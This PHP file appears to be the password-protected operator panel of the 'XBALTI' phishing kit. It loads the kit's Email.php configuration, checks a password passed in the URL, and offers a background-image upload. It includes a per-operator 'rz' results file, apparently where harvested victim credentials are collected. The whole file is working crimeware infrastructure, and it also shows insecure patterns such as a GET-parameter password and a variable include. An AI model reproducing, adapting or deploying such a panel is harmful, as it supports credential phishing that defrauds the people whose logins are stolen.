<?php
include '../XBALTI/Email.php';
if ($_GET['password'] == $yourpass){
echo '<html>
<head>
<style>
.xxxx {
	box-shadow: 3px 4px 0px 0px #f79494;
	background:linear-gradient(to bottom, #d61111 5%, #edb6b6 100%);
	background-color:#d61111;
	border-radius:5px;
	border:1px solid #000000;
	display:inline-block;
	cursor:pointer;
	color:#ffffff;
	font-family:Arial;
	font-size:17px;
	font-weight:bold;
	padding:12px 44px;
	text-decoration:none;
	text-shadow:0px 1px 0px #528ecc;
}
.xxxx:hover {
	background:linear-gradient(to bottom, #edb6b6 5%, #d61111 100%);
	background-color:#edb6b6;
}
.xxxx:active {
	position:relative;
	top:1px;
}
.upload-btn-wrapper {
  position: relative;
  overflow: hidden;
  display: inline-block;
}

.btn {
  border: 2px solid red;
  color: red;
  background-color: #040406;
  padding: 8px 20px;
  border-radius: 8px;
  font-size: 20px;
  font-weight: bold;
}

.upload-btn-wrapper input[type=file] {
  font-size: 100px;
  position: absolute;
  left: 0;
  top: 0;
  opacity: 0;
}
</style>';


  if (file_exists("./my.png")){
    echo '<style>
body {
  background-image: url(./my.png);
  background-position: center center;
  background-repeat: no-repeat;
  background-attachment: fixed;
  background-size: cover;
  background-color:#464646;
}
@media only screen and (max-width: 767px) {
  body {
    background-image: url(./my.png);
  }
	}
</style>';
}
elseif (file_exists("./my.jpeg")){
    echo '<style>
body {
  background-image: url(./my.jpeg);
  background-position: center center;
  background-repeat: no-repeat;
  background-attachment: fixed;
  background-size: cover;
  background-color:#464646;
}
@media only screen and (max-width: 767px) {
  body {
    background-image: url(./my.jpeg);
  }
	}
</style>';
}
elseif (file_exists("./my.jpg")){
    echo '<style>
body {
  background-image: url(./my.jpg);
  background-position: center center;
  background-repeat: no-repeat;
  background-attachment: fixed;
  background-size: cover;
  background-color:#464646;
}
@media only screen and (max-width: 767px) {
  body {
    background-image: url(./my.jpg);
  }
	}
</style>';
}
else{
    echo '<style>
body {
  background-image: url(./my.jpg);
  background-position: center center;
  background-repeat: no-repeat;
  background-attachment: fixed;
  background-size: cover;
  background-color:#464646;
}
@media only screen and (max-width: 767px) {
  body {
    background-image: url(./my.jpg);
  }
	}
</style>';
}


echo '</head>
<body>
<div align="center">
<img src="../img/XBALTI.gif" >
<form action="backgroundup.php?x" method="POST" enctype="multipart/form-data" > 
<div class="upload-btn-wrapper">
  <button class="btn">Upload Background</button>
  <input type="file" id="image" name="image" accept="image/x-png,image/gif,image/jpeg" onchange="form.submit()" />
</div>
</form>
<br>';


include "./rz".$yourname.".php";


echo '</div>
</body>
</html>';
}
else {
	$message = "Wrong Password, Mal tabon mok mkelekh";
    echo "<script type='text/javascript'>alert('$message');</script>";
}
?>